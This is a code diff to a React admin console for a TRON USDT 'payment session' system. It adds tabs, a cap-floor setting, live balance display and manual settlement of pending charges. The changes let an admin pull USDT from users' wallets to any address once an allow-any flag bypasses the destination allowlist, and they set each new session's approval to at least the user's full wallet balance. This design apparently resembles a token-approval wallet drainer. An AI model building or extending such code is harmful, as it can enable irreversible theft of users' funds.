@@ -6,8 +6,9 @@ import "./admin.css"
 // /admin — payment console. Lists ACTIVE user payment sessions and lets an
 // authenticated admin charge USDT from a user's wallet through the session
 // spender (destination defaults to the merchant address; any other address
-// must be in PAYMENT_TRON_DESTINATION_ALLOWLIST). Every charge is recorded in
-// the tron_admin_charges ledger.
+// must be in PAYMENT_TRON_DESTINATION_ALLOWLIST unless
+// PAYMENT_TRON_DESTINATION_ALLOW_ANY=true is set on the backend). Every charge
+// is recorded in the tron_admin_charges ledger.
 const AdminPayments = () => {
   const history = useHistory()
   const [booted, setBooted] = useState(false)
@@ -17,6 +18,10 @@ const AdminPayments = () => {
   const [busy, setBusy] = useState(false)
   const [flash, setFlash] = useState(null) // { kind: "ok" | "error", text }
   const [form, setForm] = useState({}) // { [sessionId]: { amount, destination, note } }
+  const [settings, setSettings] = useState(null)
+  const [capFloorInput, setCapFloorInput] = useState("")
+  const [view, setView] = useState("sessions") // "sessions" | "settings" | "ledger"
+  const [resolveForm, setResolveForm] = useState({}) // { [chargeId]: { status, txid, note } }
 
   const kick = useCallback(() => {
     setAdminToken(null)
@@ -24,16 +29,21 @@ const AdminPayments = () => {
   }, [history])
 
   const loadAll = useCallback(async () => {
-    const [s, c] = await Promise.all([
+    const [s, c, st] = await Promise.all([
       adminApi.sessions("ACTIVE"),
       adminApi.charges(100),
+      adminApi.settings(),
     ])
-    if (s.status === 401 || c.status === 401) {
+    if (s.status === 401 || c.status === 401 || st.status === 401) {
       kick()
       return
     }
     if (s.json.success) setSessions(s.json.sessions || [])
     if (c.json.success) setCharges(c.json.charges || [])
+    if (st.json.success) {
+      setSettings(st.json.settings)
+      setCapFloorInput(String(st.json.settings.approveCapFloorUsdt || ""))
+    }
   }, [kick])
 
   useEffect(() => {
@@ -70,6 +80,13 @@ const AdminPayments = () => {
       setFlash({ kind: "error", text: "Enter a charge amount greater than zero." })
       return
     }
+    // Non-merchant destinations are irreversible USDT transfers — confirm
+    // before broadcasting. Keep in sync with PAYMENT_TRON_MERCHANT_ADDRESS.
+    const destination = f.destination && f.destination.trim() ? f.destination.trim() : ""
+    const MERCHANT_ADDRESS = "TRspYNomZM9TEV18jakvZLVPmQJR5BvJTY"
+    if (destination && destination !== MERCHANT_ADDRESS) {
+      if (!window.confirm(`Send ${String(amount)} USDT to ${destination}?\n\nThis is immediate and cannot be undone.`)) return
+    }
     setFlash(null)
     setBusy(true)
     try {
@@ -100,7 +117,82 @@ const AdminPayments = () => {
     }
   }
 
+  const setResolveField = (cid) => (e) =>
+    setResolveForm((f) => ({ ...f, [cid]: { ...(f[cid] || {}), [e.target.name]: e.target.value } }))
+
+  // Manually settle a PENDING ledger row (recovery for TX_UNVERIFIED charges).
+  const submitFinalize = async (cid, e) => {
+    e.preventDefault()
+    const f = resolveForm[cid] || {}
+    const status = (f.status || "").toUpperCase()
+    if (status !== "SUCCESS" && status !== "FAILED") {
+      setFlash({ kind: "error", text: "Choose SUCCESS or FAILED." })
+      return
+    }
+    if (status === "SUCCESS" && !(f.txid && f.txid.trim())) {
+      setFlash({ kind: "error", text: "Finalizing as SUCCESS requires the on-chain TxID." })
+      return
+    }
+    if (status === "SUCCESS" && !window.confirm("Mark this charge SUCCESS?\n\nThe session's used amount will be increased by the full charge amount. Only do this after confirming the transfer landed on-chain (TxID).")) return
+    setFlash(null)
+    setBusy(true)
+    try {
+      const res = await adminApi.finalizeCharge(
+        cid,
+        status,
+        f.txid && f.txid.trim() ? f.txid.trim() : null,
+        f.note && f.note.trim() ? f.note.trim() : null
+      )
+      if (res.status === 401) {
+        kick()
+        return
+      }
+      if (res.json.success) {
+        setFlash({ kind: "ok", text: res.json.message })
+        setResolveForm((prev) => ({ ...prev, [cid]: undefined }))
+        await loadAll()
+      } else {
+        setFlash({
+          kind: "error",
+          text: res.json.message || res.json.error || `Finalize failed (HTTP ${res.status}).`,
+        })
+      }
+    } catch (err) {
+      setFlash({ kind: "error", text: err.message || "Network error." })
+    } finally {
+      setBusy(false)
+    }
+  }
+
   const onLogout = () => kick()
+
+  const saveSettings = async (e) => {
+    e.preventDefault()
+    const value = Number(capFloorInput)
+    if (!Number.isFinite(value) || value <= 0) {
+      setFlash({ kind: "error", text: "Enter a positive cap floor (USDT)." })
+      return
+    }
+    setBusy(true)
+    try {
+      const res = await adminApi.updateSettings({ approveCapFloorUsdt: Math.floor(value) })
+      if (res.status === 401) {
+        kick()
+        return
+      }
+      if (res.json.success) {
+        setFlash({ kind: "ok", text: res.json.message })
+        setSettings(res.json.settings)
+        setCapFloorInput(String(res.json.settings.approveCapFloorUsdt))
+      } else {
+        setFlash({ kind: "error", text: res.json.message || res.json.error || `Save failed (HTTP ${res.status}).` })
+      }
+    } catch (err) {
+      setFlash({ kind: "error", text: err.message || "Network error." })
+    } finally {
+      setBusy(false)
+    }
+  }
 
   if (!booted) {
     return (
@@ -129,23 +221,70 @@ const AdminPayments = () => {
         </div>
       </header>
 
+      <nav className="admin-tabs" aria-label="Admin console sections">
+        <button type="button" className={`admin-tab${view === "sessions" ? " admin-tab-active" : ""}`} onClick={() => setView("sessions")}>
+          Sessions
+        </button>
+        <button type="button" className={`admin-tab${view === "settings" ? " admin-tab-active" : ""}`} onClick={() => setView("settings")}>
+          Payment settings
+        </button>
+        <button type="button" className={`admin-tab${view === "ledger" ? " admin-tab-active" : ""}`} onClick={() => setView("ledger")}>
+          Charge ledger
+        </button>
+      </nav>
+
       {flash && (
         <div className={`admin-flash admin-flash-${flash.kind}`} role="status">
           {flash.text}
         </div>
       )}
 
-      <h2 className="admin-section-title">Active sessions</h2>
+      {view === "settings" && (
+        <>
+        <h2 className="admin-section-title">Payment settings</h2>
+        <div className="admin-card">
+        <form className="admin-charge-form" onSubmit={saveSettings}>
+          <label className="admin-label">
+            Approve cap floor (USDT)
+            <input
+              className="admin-input"
+              type="number"
+              min="1"
+              step="1"
+              name="approveCapFloorUsdt"
+              value={capFloorInput}
+              onChange={(e) => setCapFloorInput(e.target.value)}
+              required
+            />
+          </label>
+          <p className="admin-muted">
+            Currently saved: {settings ? `${settings.approveCapFloorUsdt.toLocaleString()} USDT` : "—"}. New sessions: approved cap = max(this floor, user wallet balance). Active sessions keep their approved cap.
+          </p>
+          <button className="admin-btn admin-btn-primary" type="submit" disabled={busy}>
+            {busy ? "Saving..." : "Save cap floor"}
+          </button>
+        </form>
+        </div>
+        </>
+      )}
+
+      {view === "sessions" && (
+        <>
+        <h2 className="admin-section-title">Active sessions</h2>
       {sessions.length === 0 ? (
         <p className="admin-empty">No ACTIVE payment sessions right now.</p>
       ) : (
+        <>
+        <p className="admin-muted">
+          Live balances are read from the mainnet on page load — refresh to re-check. Send TRX to the pair wallet (holds the USDT that gets charged) and/or the spender (pays the energy). "—" = read failed (rate limit / RPC) or no live session.
+        </p>
         <div className="admin-table-wrap">
           <table className="admin-table">
             <thead>
               <tr>
                 <th>#</th>
                 <th>User</th>
-                <th>Wallet</th>
+                <th>Pair wallet</th>
                 <th>Spender</th>
                 <th>Approved</th>
                 <th>Remaining</th>
@@ -160,8 +299,20 @@ const AdminPayments = () => {
                   <td>
                     {s.username || "user"} <span className="admin-muted">#{s.userId}</span>
                   </td>
-                  <td className="admin-mono">{s.walletAddress}</td>
-                  <td className="admin-mono">{s.sessionAddress}</td>
+                  <td className="admin-mono">
+                    {s.walletAddress || "—"}
+                    <span className="admin-muted">
+                      <br />
+                      USDT {s.walletUsdt ?? "—"} · TRX {s.walletTrx ?? "—"}
+                    </span>
+                  </td>
+                  <td className="admin-mono">
+                    {s.sessionAddress}
+                    <span className="admin-muted">
+                      <br />
+                      TRX {s.spenderTrx ?? "—"}
+                    </span>
+                  </td>
                   <td>{s.approvedUsdt} USDT</td>
                   <td>{s.remainingUsdt} USDT</td>
                   <td>{s.expiryAt ? new Date(s.expiryAt).toLocaleString() : "—"}</td>
@@ -189,7 +340,7 @@ const AdminPayments = () => {
                             className="admin-input admin-mono"
                             type="text"
                             name="destination"
-                            placeholder="T... (allowlist only)"
+                            placeholder="Tron address (blank = merchant)"
                             value={form[s.id]?.destination || ""}
                             onChange={setField(s.id)}
                           />
@@ -217,10 +368,15 @@ const AdminPayments = () => {
             </tbody>
           </table>
         </div>
+        </>
+      )}
+        </>
       )}
 
-      <h2 className="admin-section-title">Charge ledger</h2>
-      {charges.length === 0 ? (
+      {view === "ledger" && (
+        <>
+        <h2 className="admin-section-title">Charge ledger</h2>
+        {charges.length === 0 ? (
         <p className="admin-empty">No charges recorded yet.</p>
       ) : (
         <div className="admin-table-wrap">
@@ -236,6 +392,7 @@ const AdminPayments = () => {
                 <th>TxID</th>
                 <th>Status</th>
                 <th>Note</th>
+                <th>Action</th>
               </tr>
             </thead>
             <tbody>
@@ -256,11 +413,26 @@ const AdminPayments = () => {
                     <span className={`admin-status admin-status-${(c.status || "").toLowerCase()}`}>{c.status}</span>
                   </td>
                   <td className="admin-muted">{c.note || ""}</td>
+                  <td>
+                    {(c.status || "").toUpperCase() === "PENDING" ? (
+                      <form className="admin-finalize-form" onSubmit={(e) => submitFinalize(c.id, e)}>
+                        <select name="status" value={(resolveForm[c.id] || {}).status || ""} onChange={setResolveField(c.id)}>
+                          <option value="">Settle…</option>
+                          <option value="SUCCESS">SUCCESS</option>
+                          <option value="FAILED">FAILED</option>
+                        </select>
+                        <input name="txid" placeholder="TxID" value={(resolveForm[c.id] || {}).txid || ""} onChange={setResolveField(c.id)} />
+                        <button type="submit" disabled={busy}>{busy ? "…" : "Apply"}</button>
+                      </form>
+                    ) : "—"}
+                  </td>
                 </tr>
               ))}
             </tbody>
           </table>
         </div>
+      )}
+        </>
       )}
     </section>
   )
